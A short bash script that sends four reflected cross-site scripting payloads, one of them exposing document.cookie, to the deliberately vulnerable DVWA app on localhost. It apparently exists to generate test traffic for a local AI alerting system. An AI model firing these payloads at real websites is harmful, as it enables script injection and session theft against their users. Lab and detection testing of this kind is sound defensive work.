#!/usr/bin/env bash
# attack-xss.sh — Reflected XSS payloads against DVWA.

set -e
TARGET="${TARGET:-http://localhost:8080}"

payloads=(
  "<script>alert('xss')</script>"
  "<img src=x onerror=alert(document.cookie)>"
  "<svg/onload=alert(1)>"
  "javascript:alert(1)"
)

echo "[xss] target=${TARGET}"
for p in "${payloads[@]}"; do
  enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$p")
  url="${TARGET}/vulnerabilities/xss_r/?name=${enc}"
  printf "  → %s\n" "$p"
  curl -s -o /dev/null -A "python-requests/2.31.0" "$url"
  sleep 0.3
done
echo "[xss] done — check http://localhost:8000 for AI alerts"
